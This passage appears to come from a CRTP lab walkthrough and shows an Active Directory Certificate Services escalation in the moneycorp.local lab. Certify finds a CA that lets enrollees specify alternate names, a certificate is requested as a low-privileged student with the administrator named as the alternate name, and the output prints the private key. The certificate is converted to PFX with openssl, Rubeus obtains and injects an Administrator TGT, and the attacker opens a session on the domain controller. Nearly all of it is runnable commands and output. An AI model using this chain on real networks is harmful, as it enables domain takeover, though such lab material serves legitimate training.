- Enumerate the CA for the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute.
```
PS C:\AD\MyTools> .\Certify.exe cas

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local


[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local

[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        CA-Integration
        HTTPSCertificates
        SmartCardEnrollment-Users
        SmartCardEnrollment-Agent
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator





Certify completed in 00:00:32.5369887
```

- Request a certificate for ANY user from a template that allows enrollment for normal/low-privileged users.
```
PS C:\AD\MyTools> .\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:moneycorp.local\administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student303
[*] No subject name specified, using current context as subject.

[*] Template                : CA-Integration
[*] Subject                 : CN=student303, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : moneycorp.local\administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 22

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyzfTCQUolIy3ItL5HcLx5LRUQP3plHGb6kl9QsFMiISQWj0f
ZLkrCTERF8ClImxQLrxZxt/7dUDUyuoaJfCE781Ktd69ovzqcsRzHg7JryMVCOQP
HzCNHg8HYMudbcRmATG6efMYrGjCxo7pDVvZCA0GpBAMCEn/iOw2grd6GHPtjcLD
j1/75cw0mELqWiz9ZJaVumS7I8uJmhC51Nphf577+LtBFX52YxE3+7Jtv5njSl6r
FBOykXW+08Gtey81Ma7bilaeFb5Ez5F6ebsTal0wCKB7LZyPqH17YyDlQ0TPTVMc
UAeErUe0IBKaYp2tVClm0aXYOiEY8Cp7zvFDMQIDAQABAoIBAAf/O2PIey9VVkOd
j8YXDNPWMNaZ5147Fkqi97Xvy2Y36UJT029wRfxHnQeVQipXntQn/1RvLgMQOQ9/
JOZHT8PsDTuY91d5onQ/vNP6+v7UX5iI+PteOr9rEfxCJwDR0L3NSixQX7ExMjEE
ILGw4pqJgLBmHUMaPl8SBJciR0C9BS0YoUfqcRPSF6JzCYSVFSFdthWPDWKMpgPt
VmXJCBWWBRRI9vUmYThjDU9xEphvtxGGvNTTSB7A5WmSg+cqyVSS3b1lnXVc1/Bh
Ynp4puy7HvFoUpGrUOLdT3i0xQgJwCNxKCU+waoiAPwGR+Y9fkTUaRAhCLzWa9Y+
4zTMFW0CgYEA2kT0yPV9qChqjMRG2uWlBr3LAR5cxS/bi7RqWyr76vgcGMDCwut5
ztj2LljIGC50D9prf8EgSQySSKQNI/7+GlId+of1b6oyU95V80E/54yevDYbGbl4
dndz99DREuOwXzU5I53X2wNqfaVU9M9lBax9Ip0Nl05nBE9uIUmavj8CgYEA7ljO
I9coNYmmALbVc0Cn9GxYSohDn6IkJfE6iaHipR8s3AqaXf3QAhc7ITZIiAqdfMGp
rcyi6kKUO6x8gWCHN1N8Zks0IVHOtyYblFZyGV19w+AX/rACGGEpC9u+IRu0lObW
agPKUusc7Z4NXNzV78mNtDhbax7U6fpMcGPbgo8CgYEAmq1hNwRZbxBtKaJyf+9b
umJHeVx167tVfzR0ZnUYn1QCPTxlCNLsuDwigYejDRfmYdGsepV29q11AQtY0JiE
pExrOD6fHOnkznByQneL/OA3ITPKkrlP98wBH64Ya6V1OJM0Edxquqc6ER5YDUDn
21R4PU5E8mO6N2C+r9JEWesCgYEAs52g20mNN6tfujIOcShMadosPx6pN2eNLjq4
Dng8wIrZ14j2A9b+JlUzbjfmOP8m55laMWuBamB6LO4zdZw0yfDUUpJh2qo3ybWi
Gwt6OLtHx5DdBEXHjm/J6vHSOkkSsRO0iXgJxKsBxd/R2iVh465UZ3gBDJzTfu/t
ItVd2ukCgYAVbCGGmyx+/62qEQtdVJbUGSOCCNWNhdu/ei1f76xo2edWbOu5ILDd
Tp9lOif5iG604TffG/83I7/xvIqBzvJHWeTaf8wymOV+H5wQe5OU3upBFJ/exQQ3
vuvV4y6DjYfoLuAUmQ1MHzqoIYAVHTMjzZUpyAnjJSnRABiEpL/qhA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGpjCCBY6gAwIBAgITFQAAABZClHNtjM2+UAAAAAAAFjANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA4MTAx
MDMxNDdaFw0yNDA4MDkxMDMxNDdaMFoxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEOMAwGA1UEAxMFVXNlcnMxFjAUBgNV
BAMTDUFkbWluaXN0cmF0b3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQDLN9MJBSiUjLci0vkdwvHktFRA/emUcZvqSX1CwUyIhJBaPR9kuSsJMREXwKUi
bFAuvFnG3/t1QNTK6hol8ITvzUq13r2i/OpyxHMeDsmvIxUI5A8fMI0eDwdgy51t
xGYBMbp58xisaMLGjukNW9kIDQakEAwISf+I7DaCt3oYc+2NwsOPX/vlzDSYQupa
LP1klpW6ZLsjy4maELnU2mF/nvv4u0EVfnZjETf7sm2/meNKXqsUE7KRdb7Twa17
LzUxrtuKVp4VvkTPkXp5uxNqXTAIoHstnI+ofXtjIOVDRM9NUxxQB4StR7QgEppi
na1UKWbRpdg6IRjwKnvO8UMxAgMBAAGjggNrMIIDZzA8BgkrBgEEAYI3FQcELzAt
BiUrBgEEAYI3FQiF4ahyh8yfaOGHJoKfrlGC8vZ9gT+CwPxT+cFuAgFkAgEMMCkG
A1UdJQQiMCAGCCsGAQUFBwMCBggrBgEFBQcDBAYKKwYBBAGCNwoDBDAOBgNVHQ8B
Af8EBAMCBaAwNQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcD
BDAMBgorBgEEAYI3CgMEMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcNAwICAgCA
MA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQU
5hD0GWGjCF7ANKxSWnpep13GWqMwOAYDVR0RBDEwL6AtBgorBgEEAYI3FAIDoB8M
HW1vbmV5Y29ycC5sb2NhbFxhZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFNH+jQqn
+rQynzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8v
L0NOPW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049
UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJh
dGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9u
TGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggr
BgEFBQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29y
cC1NQ09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9j
YWw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25B
dXRob3JpdHkwTAYJKwYBBAGCNxkCBD8wPaA7BgorBgEEAYI3GQIBoC0EK1MtMS01
LTIxLTMzNTYwNjEyMi05NjA5MTI4NjktMzI3OTk1MzkxNC01MDAwDQYJKoZIhvcN
AQELBQADggEBACUR27Ej2IWpw1KZ6kHI7hHygWinflEK97BTiuhWP1UWrujkeQ1O
wg55nKDx/wdr93+cBfjAIj0nNDnPFMPK6Fq9HSVvU7oKoL2toXcC0029GgLNoCO7
E+Bx9Y7oJsGArAH1J9l1QlbJNemv7nWgqxXgPlP0NnfuG5kNhP1bnZ4XVOFDbRCQ
Gu5Y/D9tmEliT0EVC/Sc/13F1wzbohTWre++AZEM+zyz95zZfbkwZSIpekmCROB7
kH88nTGRCcnLI6PDbkEdoSPEpRGElSUQGEca7bx4dfarrdclP+FGw8H7SiWoBx2h
wV4LRPhtON00JGnaCOusSVu7bYW7OcX6lg8=
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:25.7938278
```

- Copy the whole `cert.pem` text, place it to a file `Administrator.pem` and transfer it to a Linux machine.

- Run the following command to convert the certificate to a `.pfx` one (use a null password).
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# openssl pkcs12 -in Administrator.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out Administrator.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

- Use the `Administrator.pfx` certificate to request a TGT on behalf of `dcorp\administrator`.
```
  PS C:\AD\MyTools> .\Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:Administrator.pfx /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\Administrator'
[*] Using domain controller: 172.16.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  8/10/2023 3:44:28 AM
  EndTime                  :  8/10/2023 1:44:28 PM
  RenewTill                :  8/17/2023 3:44:28 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  ndjs+zlEmcOtgM2aN0+rBg==
  ASREP (key)              :  3A114A819A1C91A518C676F90DFF0D07

PS C:\AD\MyTools> klist

Current LogonId is 0:0x500f4dc

Cached Tickets: (1)

#0>     Client: Administrator @ MONEYCORP.LOCAL
        Server: krbtgt/moneycorp.local @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 8/10/2023 3:44:28 (local)
        End Time:   8/10/2023 13:44:28 (local)
        Renew Time: 8/17/2023 3:44:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\AD\MyTools> Enter-PSSession -ComputerName mcorp-dc.moneycorp.local
[mcorp-dc.moneycorp.local]: PS C:\Users\Administrator\Documents> hostname
mcorp-dc
[mcorp-dc.moneycorp.local]: PS C:\Users\Administrator\Documents> whoami
mcorp\administrator
```
